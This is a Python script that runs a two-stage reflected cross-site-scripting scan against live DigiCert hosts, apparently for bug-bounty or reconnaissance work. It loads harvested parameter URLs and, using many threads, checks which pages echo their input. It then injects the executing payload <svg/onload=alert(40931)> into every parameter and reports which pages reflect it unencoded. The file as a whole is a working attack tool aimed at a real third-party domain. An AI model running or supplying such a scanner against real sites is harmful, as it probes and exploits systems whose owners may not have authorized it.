#!/usr/bin/env python3
"""digi_body_reflect.py -- find URLs whose response BODY reflects the query
string, then test those with an executing payload.

Stage 1 (cheap): for each candidate URL, fetch it and look for the literal
value of one request parameter in the body. No payload yet - just "does this
page echo its own input into HTML at all".
Stage 2 (only for stage-1 hits): send the <svg/onload> payload and classify
raw vs encoded.

Baseline discipline: the marker must not appear when the parameter is absent.
"""
import concurrent.futures as cf
import json
import random
import re
import string
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()
UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36"}
T = 12
CANARY = "40931"


def tok8():
    return "zq" + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def body_of(url):
    try:
        r = requests.get(url, timeout=T, verify=False, headers=UA,
                         allow_redirects=True)
        return r.status_code, (r.text or ""), r.headers.get("content-type", "")
    except Exception:
        return None, "", ""


def stage1(url):
    """Does the body echo a parameter value?"""
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    if not q:
        return None
    marker = tok8()
    newq = [(k, marker) for k, _ in q]
    probe = urlunsplit((p.scheme, p.netloc, p.path, urlencode(newq), ""))
    st, body, ct = body_of(probe)
    if st is None or "html" not in ct.lower():
        return None
    if marker not in body:
        return None
    # which parameter sits where, and is it raw?
    around = []
    for m in re.finditer(re.escape(marker), body):
        around.append(body[max(0, m.start() - 40):m.end() + 40])
        if len(around) >= 3:
            break
    return {"url": url, "probe": probe, "status": st, "len": len(body),
            "contexts": around, "params": [k for k, _ in q]}


def stage2(hit):
    """Send an executing payload to a stage-1 hit."""
    p = urlsplit(hit["url"])
    q = parse_qsl(p.query, keep_blank_values=True)
    payload = f'zq{CANARY}<svg/onload=alert({CANARY})>'
    newq = [(k, payload) for k, _ in q]
    probe = urlunsplit((p.scheme, p.netloc, p.path, urlencode(newq), ""))
    st, body, ct = body_of(probe)
    if st is None:
        return {**hit, "s2": "error"}
    raw = f"<svg/onload=alert({CANARY})" in body
    enc = bool(re.search(r"&lt;\s*svg|%3Csvg|&#60;|&#x3c;", body, re.I))
    return {**hit, "s2_status": st, "raw": raw, "encoded": enc,
            "s2_len": len(body), "s2_probe": probe,
            "s2_ctx": [body[max(0, m.start() - 60):m.end() + 60]
                       for m in re.finditer(re.escape(CANARY), body)][:2]}


def main():
    urls = json.load(open("/opt/watch/logs/digi/param_urls.json"))
    keep, seen = [], set()
    for u in urls:
        h = urlsplit(u).netloc.lower().split(":")[0]
        if not h.endswith("digicert.com") or h.endswith("partner.digicert.com"):
            continue
        # skip known third-party params that just bounce
        p = urlsplit(u)
        k = (p.netloc, p.path)
        if k in seen:
            continue
        seen.add(k)
        keep.append(u)
    print(f"[*] stage1 on {len(keep)} unique in-scope host+path param URLs", flush=True)

    hits = []
    with cf.ThreadPoolExecutor(max_workers=30) as ex:
        for i, r in enumerate(ex.map(stage1, keep), 1):
            if r:
                hits.append(r)
                print(f"[ECHO] {r['status']} {r['url'][:100]}", flush=True)
            if i % 400 == 0:
                print(f"  [{i}/{len(keep)}] echoes={len(hits)}", flush=True)
    print(f"\n[+] {len(hits)} URLs echo their own parameter into an HTML body")
    json.dump(hits, open("/opt/watch/logs/digi/body_echo.json", "w"), indent=1)

    print("\n[*] stage2: executing payload on each echo")
    tested = []
    with cf.ThreadPoolExecutor(max_workers=15) as ex:
        for r in ex.map(stage2, hits):
            tested.append(r)
            tag = "RAW" if r.get("raw") else ("ENC" if r.get("encoded") else "no")
            print(f"  [{tag}] {r.get('s2_status')} {r['url'][:95]}", flush=True)
    json.dump(tested, open("/opt/watch/logs/digi/body_echo_tested.json", "w"), indent=1)
    raws = [x for x in tested if x.get("raw")]
    print(f"\n[+] RAW reflections: {len(raws)}")
    for x in raws:
        print(f"    {x['url']}")
        print(f"    probe: {x.get('s2_probe')}")
        for c in x.get("s2_ctx", []):
            print(f"    ctx: {c[:200]}")


if __name__ == "__main__":
    main()
